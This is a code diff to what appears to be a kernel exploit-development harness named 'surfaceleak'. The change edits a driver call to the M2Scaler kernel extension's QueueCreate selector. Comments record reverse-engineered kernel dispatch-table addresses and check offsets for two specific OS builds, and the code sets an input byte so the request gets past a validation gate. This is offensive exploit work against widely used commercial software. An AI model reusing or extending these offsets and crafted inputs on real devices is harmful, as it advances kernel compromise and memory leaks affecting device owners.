@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.2"
+#define P114_BUILD @"p114-surfaceleak-v1.3"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -226,23 +226,24 @@ static void p114_hexdump(size_t maxn) {
         }
 
         /* queue FIRST (p098 v5 law) — LabOff() row size */
-        /* v1.2 law (2026-10-27, byte-verified on-disk on BOTH builds): the
-           M2Scaler kext's own dispatch table (12 rows, stride 0x30, in-size
-           at row+0x20) says sel=6 (QueueCreate) in-struct = 0xFA8 on 23F77
-           AND on 24A435 (table 0xfffffe00080efcd8, sel-6 row in=0xfa8). The
-           LabOff queue_create_size row is the IOGPU queue (0x410/0x408), NOT
-           M2Scaler — the 21:54 17-side run proved it (stIn=0x408 -> 2c2 with
-           open conn=61699). Sel-8 in = {u64} 8 B confirmed on 24A435 too
-           (sel-8 row in=8). */
         uint32_t qsz = 0xFA8u;
         static uint8_t qBuf[0xFA8];
         memset(qBuf, 0, sizeof(qBuf));
+        /* v1.3 CONTENT LAW (byte-verified on BOTH on-disk builds, 2026-10-27):
+           the sel-6 builder's tail gate reads the input byte at in+0xFA4 and
+           requires bit0 SET (tbnz w9,#0 -> real builder; bit0=0 -> ret 2c2).
+           23F77: tail 0x8a64490; 24A435: tail 0x90dcd28. The front gate
+           (in-struct 0xfa8 + first u32 <= 0x3e8, zeros pass) is identical:
+           23F77 0x8a31f58/0xa31f64, 24A435 0x909b2f8/0xb304. Tonight's device
+           2c2 (outLen=4008 echoed) = exactly this bit absent. */
+        qBuf[0xFA4] = 0x01;
         size_t qOutLen = sizeof(qBuf);
         uint64_t qOut[4] = {0};
         kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
         g_p114_qh = qOut[0];
         g_p114_queued = YES;
-        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (LabOff row; 0x410=23F77 class) zeros "
+        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (dispatch-row law: 0xfa8 both builds; "
+           @"v1.3 content law: in[0xFA4] bit0=1) "
            @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
            qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
 
